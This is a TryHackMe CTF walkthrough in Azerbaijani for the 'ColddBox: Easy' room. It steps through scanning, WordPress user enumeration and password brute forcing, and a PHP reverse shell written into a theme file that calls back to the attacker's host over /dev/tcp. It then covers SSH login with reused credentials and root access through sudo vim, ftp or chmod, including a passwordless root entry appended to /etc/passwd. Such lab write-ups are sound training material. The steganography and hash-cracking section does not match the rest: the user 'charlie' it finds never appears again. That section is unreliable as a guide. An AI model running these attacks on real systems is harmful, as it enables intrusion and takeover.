# TryHackMe — ColddBox: Easy Writeup (Azərbaycan dilində)

**Platforma:** TryHackMe  
**Otaq:** ColddBox: Easy  
**Çətinlik:** Asan  
**Bacarıqlar:** Nmap, Gobuster, WPScan, Steganography, Hash Cracking, WordPress RCE, Privilege Escalation  
**Link:** https://tryhackme.com/room/colddboxeasy

---

## Məzmun

1. [Kəşfiyyat — Nmap Skan](#1-kəşfiyyat--nmap-skan)
2. [Web Enumeration — Gobuster](#2-web-enumeration--gobuster)
3. [Steganography — Gizli Fayl](#3-steganography--gizli-fayl)
4. [Hash Sındırma — John the Ripper](#4-hash-sındırma--john-the-ripper)
5. [WPScan — İstifadəçi Tapma](#5-wpscan--istifadəçi-tapma)
6. [WordPress Admin Paneli — Reverse Shell](#6-wordpress-admin-paneli--reverse-shell)
7. [Shell Stabilləşdirmə](#7-shell-stabilləşdirmə)
8. [wp-config.php — Şifrə Tapma](#8-wp-configphp--şifrə-tapma)
9. [Privilege Escalation — Root Flag](#9-privilege-escalation--root-flag)
10. [Nəticə](#10-nəticə)

---

## 1. Kəşfiyyat — Nmap Skan

```bash
nmap -sV -sC -v <HEDEF_IP>
```

**Nəticə:**

| Port  | Servis | Versiya              |
|-------|--------|----------------------|
| 80    | HTTP   | Apache httpd 2.4.18  |
| 4512  | SSH    | OpenSSH 7.2p2        |

> **Qeyd:** SSH standart 22 portunda deyil — **4512** portundadır!

---

## 2. Web Enumeration — Gobuster

Brauzer ilə `http://<HEDEF_IP>` açıldıqda **WordPress** saytı görünür.

Gizli qovluqları tapmaq üçün:

```bash
gobuster dir -u http://<HEDEF_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Tapılan qovluqlar:**

- `/hidden` — gizli qeyd var
- `/wp-admin` — WordPress admin paneli
- `/wp-content` — WordPress məzmunu

### /hidden qovluğu

`http://<HEDEF_IP>/hidden` səhifəsindəki mesaj:

> *"C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip"*

Buradan **3 istifadəçi adı** öyrənirik:
- `c0ldd`
- `hugo`
- `philip`

---

## 3. Steganography — Gizli Fayl

Saytdakı şəkil faylında gizli məlumat var. **StegSeek** ilə sındır:

```bash
stegseek gum_room.jpg /usr/share/wordlists/rockyou.txt
```

**Nəticə:**
```
[i] Found passphrase: ""
[i] Original filename: "b64.txt"
[i] Extracting to "gum_room.jpg.out"
```

Şifrə **boş** idi! İçindəki məzmunu oxu:

```bash
cat gum_room.jpg.out
```

**Base64** ilə şifrələnmiş mətn var. Deşifrə et:

```bash
base64 -d gum_room.jpg.out
```

Nəticədə `/etc/shadow` faylının məzmunu çıxır — **charlie** istifadəçisinin hash-i tapılır:

```
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

---

## 4. Hash Sındırma — John the Ripper

`$6$` — **SHA-512** hash növüdür. John ilə sındır:

```bash
echo 'charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/' > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Nəticə:** Şifrə tapılır → bu şifrəni WordPress üçün sınayacağıq.

---

## 5. WPScan — İstifadəçi Tapma

```bash
wpscan --url http://<HEDEF_IP> --enumerate u
```

**Tapılan istifadəçilər:**
- `c0ldd`
- `hugo`
- `philip`
- `the cold in person`

İndi brute force et:

```bash
wpscan --url http://<HEDEF_IP> --usernames c0ldd,hugo,philip --passwords /usr/share/wordlists/rockyou.txt
```

**Nəticə:** `c0ldd` istifadəçisinin şifrəsi tapılır.

---

## 6. WordPress Admin Paneli — Reverse Shell

`http://<HEDEF_IP>/wp-admin` səhifəsinə gir:

- **İstifadəçi:** `c0ldd`
- **Şifrə:** wpscan ilə tapılan şifrə

### PHP Reverse Shell

**Appearance → Theme Editor → 404.php** faylını aç və içinə yaz:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'"); ?>
```

Kali-də dinlə:

```bash
nc -lvnp 4444
```

Brauzerdə bu URL-ə get:

```
http://<HEDEF_IP>/wp-content/themes/twentyfifteen/404.php
```

**Shell əldə edildi!**

---

## 7. Shell Stabilləşdirmə

Reverse shell əldə etdikdən sonra oxunaqlı etmək üçün:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

Sonra:
```bash
Ctrl + Z
stty raw -echo; fg
export TERM=xterm
```

---

## 8. wp-config.php — Şifrə Tapma

WordPress konfiqurasiya faylında verilənlər bazası şifrəsi var:

```bash
cat /var/www/html/wp-config.php
```

**Nəticə:**
```php
define('DB_USER', 'c0ldd');
define('DB_PASSWORD', 'cybersecurity');
```

Şifrənin yenidən istifadəsi — **c0ldd** istifadəçisinə SSH ilə gir:

```bash
ssh c0ldd@<HEDEF_IP> -p 4512
# Şifrə: cybersecurity
```

**User flag:**
```bash
cat /home/c0ldd/user.txt
```

---

## 9. Privilege Escalation — Root Flag

```bash
sudo -l
```

**Nəticə:**
```
(root) /usr/bin/vim
(root) /bin/chmod
(root) /usr/bin/ftp
```

### Üsul 1 — VIM ilə (ən asan)

```bash
sudo vim -c ':!/bin/bash'
whoami
# root
```

### Üsul 2 — FTP ilə

```bash
sudo ftp
!/bin/bash
whoami
# root
```

### Üsul 3 — CHMOD ilə

```bash
sudo chmod 777 /etc/passwd
echo "hacker::0:0:root:/root:/bin/bash" >> /etc/passwd
su hacker
whoami
# root
```

**Root flag:**
```bash
cat /root/root.txt
```

---

## 10. Nəticə

### İstifadə edilən texnikalar

| Addım                    | Alət / Metod                    |
|--------------------------|---------------------------------|
| Port skanı               | Nmap                            |
| Qovluq axtarışı          | Gobuster                        |
| Steganography            | StegSeek                        |
| Base64 deşifrə           | base64 -d                       |
| Hash sındırma            | John the Ripper                 |
| WordPress enumeration    | WPScan                          |
| Brute force              | WPScan                          |
| Reverse shell            | PHP + Netcat                    |
| Shell stabilləşdirmə     | Python3 pty                     |
| Şifrə tapma              | wp-config.php                   |
| SSH giriş                | c0ldd:cybersecurity / port 4512 |
| Privilege Escalation     | sudo vim / ftp / chmod          |

### Əldə edilən flaglar

- **User flag:** `/home/c0ldd/user.txt`
- **Root flag:** `/root/root.txt`

### Öyrənilənlər

- SSH standart portda olmaya bilər — həmişə tam port skanı et.
- Şəkil fayllarında gizli məlumat ola bilər (Steganography).
- WordPress saytlarında həmişə `wp-config.php` yoxla — şifrə ola bilər.
- Şifrə yenidən istifadəsi (`password reuse`) çox yayılmış zəiflikdir.
- `sudo -l` ilə icazələri yoxla — vim, ftp, chmod kimi alətlər root almağa imkan verir.

---

*Writeup müəllifi: CTF həvəskarı*  
*Tarix: 2026*
